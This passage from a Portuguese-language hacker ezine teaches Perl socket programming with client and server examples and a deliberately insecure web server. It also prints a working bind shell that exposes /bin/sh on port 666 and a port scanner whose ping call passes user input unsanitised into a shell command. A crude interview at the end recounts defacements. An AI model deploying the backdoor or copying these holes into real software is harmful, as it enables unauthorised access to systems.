A string compactada com quatro bytes para o endereco IP "invalido" 
(mascara de bits). Equivalente a inet_aton('255.255.255.255').




############### IO::Socket ###############

Funcoes predefinidas que usam as mesmas sintaxes do modulo Socket:

socket, socketpair, bind, listen, send, recv, peername(getpeername), 
sockname(getsockname).



Subclasses do IO::Socket: INET e UNIX.

INET: Usada para manipular soquetes de dominio da Internet.
UNIX: Usada para manipular soquetes de domninio do Unix.



Metodos IO::Socket para INET e UNIX.

1) accept
sintaxe: accept ([pacote])

Executa a chamada do sistema accept em um soquete e retorna um novo 
objeto. O novo objeto sera criado na mesma classe como o soquete 
atendente, a menos que o pacote seja especificado. O objeto podera ser 
usado para se comunicar com o cliente que estava tentando conectar. Em 
um contexto escalar, um novo soquete sera retornado ou undef no caso de 
falha. Em um contexto do array, um array com dois elementos sera 
retornado contendo o novo soquete e o endereco igual ou uma lista vazia 
no caso de falha.



2) timeout
sintaxe: timeout ([val])

Define ou recupera o valor de intervalo associado a um soquete. Sem um 
argumento, o valor atual sera retornado. Se um intervalo com o val for 
dado, a definicao sera alterada para o val e o valor anterior sera 
retornado.



3) sockopt
sintaxe: sockopt (op, [val])

Define e recupera a opcao de soquete op no nivel SOL_SOCKET. O valor val
sera definido para a opcao, se dado. Se nenhum valor for fornecido, a 
funcao retornara a definicao atual da opcao.



4) sockdomain
sintaxe: sockdomain

Retorna o numero que representa o dominio de endereco do soquete. Por 
exemplo, um soquete AF_INET tem o valor &AF_INET.



5) socktype
sintaxe: socktype

Retorna o numero que representa o tipo de soquete. Por exemplo, um 
soquete SOCK_STREAM tem o valor &SOCK_STREAM.



6) protocol
sintaxe: protocol

Retornara o numero do protocolo para o protocolo que esta sendo usado no
soquete, se conhecido. Se o protocolo for desconhecido, como com um 
soquete AF_UNIX, retornara zero.




############### Referencia do IO:Socket:INET 
                         soquetes do dominio da Internet: ###############

1) PeerAddr
sintaxe: PeerAddr => nome_host[:porta]

Especifica o host remoto e o numero da porta opcional para uma conexao 
do cliente. O nome_host podera ser um nome, como www.fuck.com ou um 
numero de IP com a forma 200.217.98.100.



2) PeerPort
sintaxe: PeerPort => porta

Especifica o numero da porta no host remoto para uma conexao do cliente.
O nome do servico (como http ou nntp) podera ser usado para o argumento 
se o numero da porta for desconhecido. 



3) LocalAddr
sintaxe: LocalAddr => nome_host[:porta]

Especifica o endereco local (e o numero da porta opcional) para vincular
um soquete no lado do servidor.



4) LocalPort
sintaxe: LocalPort => porta

Especifica o numero da porta local (ou nome do servico) para vincular um
soquete no lado do servidor.



5) Proto
sintaxe: Proto => nome

Especifica o protocolo a ser executado no soquete, por exemplo, tcp ou 
udp.



6) Type
sintaxe: Type => SOCK_STREAM | SOCK_DGRAM

Espefica o tipo de soquete. SOCK_STREAM indica uma conexao de soquete 
baseada em fluxo e SOCK_DGRAM indica uma conexao (datagrama) baseada em 
messagens.



7) Listen
sintaxe: Listen => n

Define o tamanho da fila atendente para o numero n de solicitacoes do 
cliente.



8) Reuse
sintaxe: Reuse => 1

Dado um numero diferente de zero, esta opcao permitira que o endereco de
vinculo local seja reutilizado, caso o soquete precise ser reaberto 
depois de um erro.



9) Timeout
sintaxe: Timeout => n

Define o intervalo.




############### Metodos do IO:Socket:INET ###############

1) sockaddr
sintaxe: sockaddr

Retorna a parte do endereco (como string compactada) da estrutura de 
dados de endreco do soquete para o soquete.



2) sockport
sintaxe: sockport

Retorna o numero da porta local para o soquete.



3) sockhost
sintaxe: sockhost

Retorna a parte do endereco da estrutura de dados de endereco do soquete
na forma de string com quatro partes e pontos, por exemplo, 200.217.98.100.



4) peeraddr
sintaxe: peeraddr

Retorna a parte do endereco (string compactada) da estrutura de dados de
endereco do soquete para o host remoto ao qual um soquete se conecta.



5) peerport
sintaxe: peerport

Retorna o numero da porta para o host remoto ao qual um soquete se 
conecta.



6) peerhost
sintaxe: peerhost

Retorna o endereco do host remoto na forma de string com quatro partes e
pontos, por exemplo, 200.217.98.100.




############## Referencia do IO:Socket:UNIX ##############

1) Type
sintaxe: Type => SOCK_STREAM | SOCK_DGRAM

Indica o tipo de soquete.



2) Local
sintaxe: Local => nome_caminho

Fornece o nome do caminho do buffer FIFO (First In, First Out) para 
vincular o soquete.



3) Peer
sintaxe: Peer => nome_caminho

Fornece o nome do caminho para o buffer FIFO de destino.



4) Listen
sintaxe: Listen => n

Cria um soquete atendente e define o tamanho da fila para n.




############### Metodos de IO:Socket:UNIX ###############

1) hostpath
sintaxe: hostpath

Retorna o nome do caminho para o buffer FIFO local.



2) peerpath
sintaxe: peerpath

Retorna o nome do caminho para o FIFO de destino ou igual.


EOF

<-->

Bom vc tem em maos as funcoes que nao passam de pecas para montar um 
programa leia todas com atencao isso serah util se tiver alguma duvida 
volte e leia novamente afinal vc sabendo as funcoes nao vai adiantar 
muita coisa sem alguns exemplos e eh isso que veremos agora vamos por em
pratica tudo que vc leu no Funcoes.txt =:).




CONTINUANDO O TOPICO "SOQUETES":

Com as funcoes em maos vamos agora utiliza-las para criar nossos 
programas em soquete. Achei melhor para nao complicar apenas vamos 
trabalhar com PF_INET e SOCK_STREAM, soquetes do dominio da internet e 
dados de fluxo respectivamente. =:D

Agora vamos criar nossos programas em perl usando soquetes.

Primeiro Programa basico cliente:

<++> Soquetes/basico1.pl

#!/usr/bin/perl -w

use Socket;
my $host = inet_aton('127.0.0.1');
my $destino = sockaddr_in (21, $host);
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die $!;
connect(SOCK, $destino) or die $!;
exit;

<-->

Bem oq temos ae eh um programa super basico q conecta na maquina local 
na porta 21 (ftp) e em seguida fecha o programa, se olharmos no 
Funcoes.txt vamos ter:

1) inet_aton('127.0.0.1');
sintaxe: inet_aton(nome_host);
Temos o nosso nome_host q eh o ip local

2) sockaddr_in(21, $host);
sintaxe: sockaddr_in(porta, string_ender);
Temos ae a porta e o $host e se foce para soquetes Unix seria 
sockaddr_un.

3) socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp');
sintaxe: socket (soquete, dominio, tipo, protocolo);
Criamos um novo objeto chamado SOCK definimos PF_INET significa que 
iremos usar soquete no dominio da internet se foce do dominio Unix 
Teriamos PF_UNIX ae vem SOCK_STREAM indica que vamos usar dados de fluxo
e se foce pacotes de dados separados iriamos utilizar SOCK_DGRAM.

4) connect(SOCK, $destino);
sintaxe: connect (soquete, endereco);
Aqui vamos conectar no SOCK com o $destino

Vamos a mesma aplicacao basica para cliente soh q escrita de outra 
maneira para melhorar

<++> Soquetes/basico2.pl

#!/usr/bin/perl

use Socket;

my($HOST,$PORTA);
print "Host: ";
chomp($HOST=<STDIN>);
print "Porta: ";
chomp($PORTA=<STDIN>);
my $addr = inet_aton('$HOST');
my $destino = sockaddr_in($PORTA, $HOST);
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, $destino);
exit;

<-->

Temos o mesmo programa do anterior soh que temos a possibilidade de 
espeficicar o host e a porta que queremos conectar nada mais que isso
=:). Podemos fazer ainda mais aos poucos vamos avancando por enquanto
apenas nas aplicacoes clientes.

Vamos usar agora um pouco de send.

<++> Soquetes/basico3.pl

#!/usr/bin/perl

use Socket;

my($HOST,$PORTA,$MSG);
print "Host: ";
chomp($HOST=<STDIN>);
print "Porta: ";
chomp($PORTA=<STDIN>);
print "Msg: ";
chomp($MSG=<STDIN>);
$line = "\n";
my $addr = inet_aton('$HOST');
my $destino = sockaddr_in($PORTA, $addr);
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, $destino) or die $!;
send(SOCK, $MSG, 0) or die $!;
send(SOCK, $line, 0) or die $!;
exit;

<-->

Segue o mesmo estilo do programa anterior mais com a possibilidade de
enviar messagens para determinado porta host.
Nos estamos usando agora send para enviar messagens ao uma determinada
aplicacao servidor.
sintaxe: send soquete, msg, marcas, [dest].

Vamos a mais um exemplo de send:

<++> Soquetes/basico4.pl

#!/usr/bin/perl

use Socket;

my($HOST,$PORTA,$USER,$PASS);
print "Host: ";
chomp($HOST=<STDIN>);
print "Porta: ";
chomp($PORTA=<STDIN>);
print "User: ";
chomp($USER=<STDIN>);
print "Password: ";
system("stty -echo");
chomp($PASS=<STDIN>);
system("stty echo");
print "\n";
$line = "\n";
my $addr = inet_aton('$HOST');
my $destino = sockaddr_in($PORTA, $addr);
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, $destino) or die $!;
print "Send user...\n";
sleep 2;
send(SOCK, $USER, 0) or die $!;
print "Done!\n";
send(SOCK, $line, 0) or die $!;
print "Send PassWord...\n";
sleep 2;
send(SOCK, $PASS, 0) or die $!;
send(SOCK, $line, 0) or die $!;
print "Done!\n";
print "User and Password is Ok\n";
exit;

<-->

Temos aqui as opcoes para enviar o usuario e senha para uma porta host
para q seja feita uma autenticacao mais nao uma seçao. Temos um efeito
legal na parte de digitar o password q nao aparece nada =:P. Vc pode 
usar isso para verificar user e senha no ftp, telnet e etc. Nao passa de
outro exemplo com send.

Acho que algumas coisas ficaram claro relacionado a soquetes ate o 
momento isso soh depedende de vc para criar =:) vamos trabalhar com 
soquetes do lado do servidor agora.

<++> Soquetes/server1.pl

#!/usr/bin/perl

use Socket;

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die $!;
my $sockin = sockaddr_in(666, INADDR_ANY);
bind(SOCK, $sockin) or die $!;
$lenght = 5;
listen(SOCK, $lenght);
accept(CLIENT, SOCK) or die $!;
while (<CLIENT>) {
print "$_\n";
}

<-->

Bom isso ae eh o basico do basico de aplicacoes servidor vamos a 
explicacao:

em $sockin: sockaddr_in(666, INADDR_ANY), bom eh parecido com o cliente
ah nao ser por isso INADDR_ANY essa funcao faz com que o sistema 
selecione o devido endereco para a maquina.

em bind(SOCK, $sockin); temos a funcao bind: 
sintaxe: bind soquete, endereco
Anexa um endereco a um soquete ja aberto especificado pelo handle de 
arquivo soquete(SOCK). A funcao retornara true se for bem-sucedida e 
false do contrario (e colocara o codigo do erro em $!). O endereco 
devera ser um endereco compactado do devido tipo do soquete ($sockin).

em $lenght apenas definimos o numeros de conexoes suportadas

em listen(SOCK, $lenght), temos a funcao listen:
sintaxe: listen soquete, tamanho_da_fila
Informa ao sistema operacional que vc esta pronto para aceitar as 
conexoes no soquete(SOCK) e define o numero de conexoes que aguardam 
para o tamanho_da_fila($lenght). Se a fila estiver cheia, os clientes 
que tentam conectar o soquete terao a conexao recusada. Usada apenas 
para os soquetes do lado do servidor.

em accept(CLIENT, SOCK) temo a funcao accept: 
sintaxe: accept novo_soquete, soquete_generico 
Prepara um processo do servidor para aceitar as conexoes de soquete dos 
clientes. A execucao e suspensa ate que uma conexao seja feita, neste 
momento o handle de arquivo novo_soquete(CLIENT) e aberto e anexado a 
conexao feita recentemente. A funcao retornara o endereco conectado se a
chamada tiver sucesso, do contrario, retornara false (colocando o erro 
em $!). O soquete_generico(SOCK) tera que ser um handle de arquivo ja 
aberto atraves da funcao socket e vinculado a um dos enderecos de rede 
do servidor. E usado apenas no lado do servidor.

Com base nos exemplos anteriores vc pode usar chomp apenas para 
selecionar ah porta q deseja utilizar. Bem as aplicacoes servidor sao um
assunto bastante extenso por isso eu nao vou dar muita atencao a elas 
vou colocar um exemplo jah avancado do uso de soquetes do lado do 
servidor como um servidor de web bem simples e INSEGURO =:) only for 
test, me basiei em outros programas para completalo por tanto nao eh 
100% de minha autoria =:).

<++> Soquetes/WebServer.pl

#!/usr/bin/perl

# Uso: bash:~#perl WebServer.pl
#      Root dir: /home/web/
#      Index: index.html
#      LogFile: web.log
#      Port: 80
#
# onde Root dir: diretorio onde vao se encotrar os arquivo, index.html e web.log
# onde Index: tem q ser a index.html dentro de Root Dir
# onde LogFile: tem q ser o arquivo de log dentro de Root Dir
# onde Port: a porta onde o webserver ira funcionar
# o diretorio /home/web/ eh apenas um exemplo o index.html vc mesmo cria como exemplo e o arquivo de log tambem use
# bash:~/home/web# touch web.log
# programa baseado em outros
use Socket;

my($ROOTDIR,$INDEX,$LOGFILE,$PORTA);
print "Root dir: ";
chomp($ROOTDIR=<STDIN>);
print "Index: ";
chomp($INDEX=<STDIN>);
print "Logfile: ";
chomp($LOGFILE=<STDIN>);
print "Port: ";
chomp($PORTA=<STDIN>);

%mimes = ("html","text/html",
        "htm","text/html",
        "txt","text/plain",
        "gif","image/gif",
        "jpg","image/jpeg",
        "zip","application/x-zip-compressed",
        "tar","application/x-tar",
        "gz","application/x-gzip",);

$mime_padrao = "text/html";

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die("socket: $!");
setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) or die("setsockopt: $!");
bind(SOCK, sockaddr_in($PORTA, INADDR_ANY)) or die("bind: $!");
listen(SOCK, SOMAXCONN) or die("listen: $!");
$time=scalar(localtime);
&log("Servidor iniciado na porta $PORTA - [$time]");
        for(; $paddr = accept(CLIENT,SOCK); close CLIENT)
        {
                ($PORTA,$iaddr) = sockaddr_in($paddr);
                $nome = gethostbyaddr($iaddr,AF_INET);
                $get_request=<CLIENT>;

                chop($get_request) if $get_request =~ /\r$/;
                chop($get_request) if $get_request =~ /\n$/;
                chop($get_request) if $get_request =~ /\cM/;
                ($get,$file,$crap) = split(/\s+/, $get_request);
                $file .= "$INDEX" if $file =~ m@/$@;
                @dot_parts=split(/\./,$file);
                $type=@dot_parts[int(@dot_parts - 1)];
                if($file =~ /\.\./)
                {
                        $time=scalar(localtime);
                        &log("$nome - [$time] - \"$get_request\"");
                        &error("Bad Request");
                }
                $time=scalar(localtime);
              &log("$nome - [$time] - \"$get_request\"");
                open(FILE,"$ROOTDIR$file") || &error1($file);
                binmode(FILE) unless $mimes{$type} =~ /^text/i;
                print CLIENT "HTTP/0.9 200 OK\r\n";
                print CLIENT "Date: $time\r\n";
                print CLIENT "Server: WebServer \r\n";
                print CLIENT "Content-type: $mimes{$type}\r\n\r\n" if($type ne "");
                print CLIENT "Content-type: $mime_padrao\r\n\r\n" if($type eq "");
                while(<FILE>)
                {
                        print CLIENT $_;
                }
                close(FILE);
                close(CLIENT);
        }

sub error1
{
        $file=shift(@_);
        print CLIENT "HTTP/0.9 404 Not Found\r\n\r\n";
        print CLIENT "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n";
        print CLIENT "<HTML><HEAD>\n";
        print CLIENT "<TITLE>404 Not Found</TITLE>\n";
        print CLIENT "</HEAD><BODY>\n";
        print CLIENT "<H1>Not Found</H1>\n";
        print CLIENT "A URL requisitada $file nao se encontra nesse servidor.<P>\n";
        print CLIENT "</BODY></HTML>\n";
        close(CLIENT);
}
sub error
{
        $error=shift(@_);
        print CLIENT "HTTP/0.9 400 Bad Request\r\n\r\n";
        print CLIENT "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n";
        print CLIENT "<HTML><HEAD>\n";
        print CLIENT "<TITLE>Error - $error</TITLE>\n";
        print CLIENT "</HEAD><BODY>\n";
        print CLIENT "<H1>$error</H1>\n";
        print CLIENT "Ocorreu um erro na sua requisicao.<P>\n";
        print CLIENT "</BODY></HTML>\n";
        close(CLIENT);
}
sub log
{
        $msg=shift(@_);
        open(LOG,">>$LOGFILE") || die($!);
        print LOG "$msg\n";
        close(LOG);
        print "$msg\n";
}

<-->

Bom vou explicar algumas coisas dele ae que vc ainda nao conhece =:D

Aqui:
setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) or die("setsockopt: $!");

setsockopt:
sintaxe: setsockopt soquete, nivel, nome_opç, val_opç

Define a opcao do soquete(SOCK) solicitada por nome_opç(SO_REUSEADDR) 
para o val_opç (pack("l", 1). A funcao retornara indefinida se houver 
erro. O val_opç (pack("l", 1) podera ser especificado como undef se voce
nao quiser transmitir um argumento. O nivel(SOL_SOCKET) especificara o 
tipo de protocolo usado no soquete.

Aqui:
pack("l", 1)

pack gabarito, lista

Obtem uma lista de valores e compacta-la em uma estrutura binaria, 
retornando a string que contem a estrutura. O gabarito("l") e uma 
sequencia de caracteres que fornece a ordem e o tipo de valores.

Caractere  Significado

"l"        Um valor longo Sinalizado

Cada caractere podera ser seguido opcionalmente por um numero(1) que 
fornece uma contagem de repeticoes.

Bom de novo relacionado a esse assunto Soquetes temos apenas isso o 
resto vc jah viu e o resto do programa nao faz parte do topico =:D.

Agora com funcoes parecidas tenho aqui uma bind shell.

<++> Soquetes/bindshell.pl

#!/usr/bin/perl

#########################################################
# simples bindshell escrita em perl muito generica =:D  #
# bash:~$ perl bind-shell.pl &                          #
# ou bash:~$ chmod +x bind-shell.pl                     #
# bash:~$ ./bind-shell.pl &                             #
#########################################################

use Socket;
$porta = 666;
$sys = 'echo "(`whoami`@`uname -n`:`pwd`)"; /bin/sh';
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die $!;
setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) or die $!;
bind(SOCK, sockaddr_in($porta, INADDR_ANY)) or die $!;
listen(SOCK, SOMAXCONN) or die $!;
for(; $paddr = accept(CLIENTE, SOCK); close CLIENTE)
{
open(STDIN, ">&CLIENTE");
open(STDOUT, ">&CLIENTE");
open(STDERR, ">&CLIENTE");
system($sys);
close(STDIN);
close(STDOUT);
close(STDERR);
}

<-->

Como pode ver eh simples muito simples mesmo ela apenas abre uma porta 
com acesso ah /bin/sh como toda as outras bindshell's as funcoes 
relacionadas a soquetes sao iguais as do webserver.



################## IO::Socket ##################

Vamos igual ao modulo Socket vamos criar aplicacoes basicas para cliente:

<++> Soquetes/io1.pl

#!/usr/bin/perl

use IO::Socket;

$sock = IO::Socket::INET->new(PeerAddr => '127.0.0.1',
                             PeerPort => 21,
                             Proto => 'tcp');
die "$!" unless $sock;

<-->

use IO::Socket; estamos dizendo ao perl q iremos utilizar o modulo 
IO::Socket

$sock = IO::Socket::INET->new(PeerAddr => '127.0.0.1',
                             PeerPort => 21,
                             Proto => 'tcp');
IO::Socket::INET isso indica que estamos criando um soquete de dominio 
da Internet
->new um novo socket claro.

PeerAddr => '127.0.0.1' Especifica o host remoto e o numero da porta 
opcional para uma conexao do cliente. O nome_host podera ser um nome, 
como www.fuck.com ou um numero de IP com a forma 200.217.98.100.

PeerPort => 21 Especifica o numero da porta no host remoto para uma 
conexao do cliente. O nome do servico (como http ou nntp) podera ser 
usado para o argumento se o numero da porta for desconhecido.

Proto => Especifica o protocolo a ser executado no soquete, por exemplo,
tcp ou udp.

Bem simples nao... =:) IO::Socket eh muito bao mesmo vamos fazer um 
pequeno quadro comparativo:

Modulo IO::Socket                 Modulo Socket

use IO::Socket;                   use Socket;
IO::Socket::INET->new             socket(SOCK, PF_INET, SOCK_STREAM, $proto);
PeerAddr                          inet_aton('127.0.0.1');
PeerPort                          sockaddr_in(21, $host);
Proto                             getprotobyname('tcp');

Mais um exemplo de IO::Socket com melhoras:

<++> Soquetes/io2.pl

#!/usr/bin/perl

use IO::Socket;

my($HOST,$PORTA);
print "Host: ";
chomp($HOST=<STDIN>);
print "Porta: ";
chomp($PORTA=<STDIN>);
$sock = IO::Socket::INET->new(PeerAddr => $HOST,
                             PeerPort => $PORTA,
                             Proto => 'tcp');
die "$!" unless $sock;

<-->

Mesmo programa soh que agora podemos espeficicar um host e porta para 
conectar =:D

Vamos como no modulo Socket usaremos um exemplo de send...

<++> Soquetes/io3.pl

#!/usr/bin/perl

use IO::Socket;

my($HOST,$PORTA,$MSG);
print "Host: ";
chomp($HOST=<STDIN>);
print "Porta: ";
chomp($PORTA=<STDIN>);
print "Msg: ";
chomp($MSG=<STDIN>);
$sock = IO::Socket::INET->new(PeerAddr => $HOST,
                             PeerPort => $PORTA,
                             Proto => 'tcp');
die "$!" unless $sock;
send($sock, $MSG, 0);

<-->

Da no mesmo que o programa anterior soh que agora podemos mandar uma msg
para o host porta usando send da mesma maneira.

Mais um de send:

<++> Soquetes/io4.pl

#!/usr/bin/perl

use IO::Socket;

my($HOST,$PORTA,$USER,$PASS);
print "Host: ";
chomp($HOST=<STDIN>);
print "Porta: ";
chomp($PORTA=<STDIN>);
print "User: ";
chomp($USER=<STDIN>);
print "Password: ";
system("stty -echo");
chomp($PASS=<STDIN>);
system("stty echo");
$line = "\n";
$sock = IO::Socket::INET->new(PeerAddr => $HOST,
                             PeerPort => $PORTA,
                             Proto => 'tcp');
die "$!" unless $sock;
send($sock, $USER, 0) or die $!;
send($sock, $line, 0) or die $!;
send($sock, $PASS, 0) or die $!;
send($sock, $line, 0) or die $!;
print "\n";
print "User and Password Ok!\n";

<-->

Segue o mesmo modelo do basico4.pl para verificacao de user e password.

Vamos para uma aplicacao servidor com IO::Socket:

<++> Soquetes/ioserver.pl

#!/usr/bin/perl

use IO::Socket;
$sock = IO::Socket::INET->new(LocalAddr => '127.0.0.1',
                              LocalPort => 80,
                              Proto => 'tcp',
                              Listen => 5);
die "$!" unless $sock;
$new_sock = $sock->accept();

<-->

LocalAddr e LocalPort fornecerao o endereco e a porta para vincular o 
soquete.
Listen fornece o tamanho da fila para o numero de solicitacoes do cliente.
Quando uma solicitacao para conexao eh feita eh chamado o metodo accept()
no objeto soquete para criar um novo objeto de soquete no qual o resto 
da comunicacao podera ocorrer.

Bom como disse antes soh iriamos trabalhar com INET ou seja dominios da 
Internet futuramente poderei fazer algum txt relacionado com dominio Unix. 

Como ultimo programa em IO::Socket apresento o muloscan, feito por 
GraNde_MuLo, um scan port muito bom escrito em perl NO QUAL NAO EH DE 
MINHA AUTORIA =:D.

<++> Soquetes/muloscan.pl

#!/usr/bin/perl

#####################################################################
#                                                                   #
#  MuloScan: Perl ''Scanner'' By GraNde_MuLo                        #
#  REQUIRED: Perl && IO::Socket module (Socket.pm)                  #
#                                                                   #
#  I coded this *simple* ''scanner'' because i wanted to work       #
#  with perl & sockets.. This code searches on the specified        #
#  ip for 'well-known' ports, creating a tcp/udp connect to them,   #
#  but you've also the possibility to specify 3 ports by            #
#  command-line or to add them directly in the code.                #
#                                                                   #
#  REMEMBER: I AM NOT RESPONSIBLE FOR WHAT YOU'LL DO WITH THIS      #
#  CODE, AND I'VE WRITTEN IT *ONLY* FOR EDUCATIONAL PURPOSES.       #
#  I CODE ONLY FOR FUN, SO THERE MIGHT BE A LOT OF BUGS!            #
#  ---------------------------------------------------------        #
#  Tested: on *BSD (/usr/src/sys/compile/Clitoride4 386)            #
#  Mon Apr 16  13:24:05 CEST 2001                                   #
#                                                                   #
#####################################################################

use IO::Socket;

$port1 = $ARGV[1];
$host = $ARGV[0];

if ($host == "") {



print "\a\n";
print "Usage:   ./muloscan.pl [IP] (port -optional-)\n";
print "Example: ./muloscan.pl 127.0.0.1\n";
print "Example: ./muloscan.pl 127.0.0.1 21,22\n";
print "Exiting...\n";
print "\n";
exit;}

############## BEGIN ##################

print "\n";
print "-------------------------------\n";
print "--- MuloScan by GraNde_MuLo ---\n";
print "--- mail: io\@\grandemulo.it  ---\n";
print "-------------------------------\n";
sleep(1);
print "\n";
print "Checking if $host is up..\n";
@ping = `ping -c 2 $host`;
if ( $ping[2] == "") {
print "Shit! $host seems down..\a\n";
print "Exiting..\n";
exit;} else {
print "OK! Host seems to be up\n";
print "Scanning $host for Well-Known ports\n";
print "\n";

######### PORTS / PROTOCOLS / INFO ####################


@poo = split(",",$port1);

$port = '21';
$protocol = 'tcp   ';
$info = 'ftp   ';
&go;
$info = 'ssh   ';
$port = '22';
$protocol = 'tcp   ';
&go;
$info = 'smtp  ';
$port = '25';
$protocol = 'tcp   ';
&go;
$info = 'ns    ';
$port = '53';
$protocol = 'udp   ';
&go;
$info = 'finger';
$port = '79';
$protocol = 'tcp   ';
&go;
$info = 'httpd ';
$port = '80';
$protocol = 'tcp   ';
&go;
$info = 'pop3  ';
$port = '110';
$protocol = 'tcp  ';
&go;
$info = 'ntbios';
$port = "139";
$protocol = "tcp  ";
&go;
$info = 'nntp  ';
$port = '119';
$protocol = 'tcp  ';
&go;
$info = 'imap  ';
$port = '143';
$protocol = 'tcp  ';
&go;
$info = 'imap3 ';
$port = 220;
$protocol = 'tcp  ';
&go;
$info = 'nfsd  ';
$port = '2049';
$protocol = 'tcp ';
&go;
$info = 'squid ';
$port = '3128';
$protocol = 'tcp ';
&go;
$info = 'ircd  ';
$port = '6667';
$protocol = 'tcp ';
&go;
$info = 'proxy ';
$port = '8080';
$protocol = 'tcp ';
&go;
print "\n";
$info = '(specified by user) ';
$protocol = 'tcp ';
if ($poo[0] == "") {
print "Check: NO PORT(S) SPECIFIED BY USER";
&quit } elsif ($poo[1] == "") {
$port = "$poo[0]";
&go;
&quit;} elsif ($poo[2] == "") {
$port = "$poo[0]";
&go;
$port = "$poo[1]";
&go;
&quit;
} else {
$port = "$poo[0]";
&go;
$port = "$poo[1]";
&go;
$port = "$poo[2]";
&go;
############ UNCOMMENT & ADD YOUR OWN PORTS! :) #######################

# $info = ' YOUR INFO ';
# $port = ' YOUR PORT ';
# $protocol = ' YOUR PROTOCOL ';
# &go;
########################################################
}
&quit;

######### SUB ROUTINES (TCP/UDP CONNECT / PRINT / QUIT) ###############
sub check {

if ($sock = IO::Socket::INET->new(PeerAddr => $host,
                                 PeerPort => $port,
                                 Proto    => $protocol)) {
print "OPENED\a\n";
} else {
print "Closed\n";
}
sub print {
print "Check: $port/$protocol $info --> ";
}
sub quit {
print "\n";
sleep(2);
print "Exiting...\n";
print "\n";
exit;
}
sub go {

&print;
&check;
}
}}

<-->

Bom aqui acaba =:( acho q nao tem oq explicar ae desse scan afinal a 
parte do nosso txt jah foi explicada =:D.
Adeus.











        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~     14 - Entrevista -      ~YXXXXx_
  _xXXXXXX(            Cheat Struck        )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat Struck        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

Struck: Finalmente conseguimos contato com essa ilustre figura do
        hacking brasileiro: Cheat Struck.
        Ola.
Struck: Alou.

Struck: Como voce se sente?
Struck: Meio nervoso. Nunca fui entrevistado antes.

Struck: Entao para quebrar o nervosismo posso comecar com uma pergunta
        pessoal??
Struck: Hmmm.. ok

Struck: Voce tem namorada??
Struck: nao.

Struck: Como que pode um bunitao como voce nao ter namorada?
Struck: Ora essa. Voce que eh lindo.

Struck: Obrigado. Mas acho que nao eh isso que nossos leitores pretendem
        saber nesta entrevista.
Struck: Espero que nao, afinal 99% dos leitores da f3 sao homens.

Struck: Realmente.
Struck: ...

Struck: ...
Struck: hm... 

Struck: ;)
Struck: =*

Struck: Diga algo que nossos leitores possam se interessar.
Struck: Sei la. Que tal computadores?? 

Struck: Boa. Conte-nos como foi sua primeira relacao com um computador.
Struck: Bem... cof! cof! Achu que isso eh meio pessoal.

Struck: Voce ja gozou no teclado?
Struck: Nao. Eu costumo usar a mao como escudo.

Struck: Hm... interessante.
Struck: Eh preciso ter reflexos rapidos.

Struck: Voce tem algum super poder??
Struck: Eu posso fazer o monitor ficar preto apenas olhando para ele
        por alguns minutos.

Struck: Puxa vida! Aposto que vc nunca precisou usar screem savers.
Struck: Hmm... eh verdade. Talvez isso acontecao por causa dos screem
        savers. Nunca havia pensado nisso.

Struck: Entao fora isso, o que voce sabe fazer??
Struck: Eu sei fazer ezines.

Struck: O que eh isso?
Struck: Eh um monte de textos que eu escrevo sobre coisas inuteis que
        nunca precisaremos usar na vida real.

Struck: E as pessoas leem isso?
Struck: Por incrivel que pareca.

Struck: Fale-nos mais sobre estas ezines.
Struck: Atualmente eu escrevo a fatal3rror. Ja escrevi a cszine, alem
        de materias para a DeathKnights, s13, entre outras.

Struck: E te pagam para escrever estas materias?
Struck: Nao.

Struck: Entao pq voce as escreve?
Struck: Porque eu sou troxa.

Struck: Serio.
Struck: Sei la! Falta do que fazer, hobbie, for fun,... Sei la.

Struck: Qual seu objetivo com estes textos??
Struck: Primeiramente, aprender mais. Pq assim como no colegio, qdo 
        voce faz um trabalho, pesquiza mais sobre o assunto e assim
        aprende mais.

Struck: e os outros objetivos??
Struck: Ah sim!!
        Fama, gloria pessoal e status na sociedade.

Struck: Como surgiu a ideia de escrever uma zine?
Struck: A fatal3rror surgiu do nada. Uma noite eu comecei a juntar os
        textos q tinha comecado a fazer e nao acabei. Dei uma relida,
        conclui-os e juntei tudo num txt soh. Joguei na inet e as
        pessoas comecaram a ler...

Struck: E qto a cszine??
Struck: Nakela epoca eu catava tudo qto era textos sobre h/p/c/s/v e
        escrevia sobre o que havia aprendido.
        No final da semana colocava na page para amigos que tb estavam
        comecando, lerem...

Struck: E pq ela acabou??
Struck: Pq comecou a fazer sucesso. Ae rolava pressao pra zine sair a
        tempo, essas coisas. Nao curtia isso, entao cabei com a zine.

Struck: Depois disso o que voce fez??
Struck: Entrei na dk.

Struck: e...
Struck: Foi isso.

Struck: O que voce fazia na deathkinghts??
Struck: Eu escrevia para a zine deles, e qdo precisava, ajudava o grupo
        ou os membros a ownar algumas maquinas.

Struck: E saiu pq??
Struck: Deu uns rolo com a bl0w. Eu conhecia o pessoal dos 2 lados
        entao pra nao sobrar pra mim, sai.

Struck: Voce foi membro da bl0w??
Struck: Nop. Apenas frequentava o canal restrito aos membros, mas nunca
        fui convidado a ser membro. E se fosse, nao aceitaria, afinal
        na epoca eu era da dk.

Struck: Voce faz defaces??
Struck: Ja fiz. Na epoca da dk.

Struck: Quais eram os motivos?
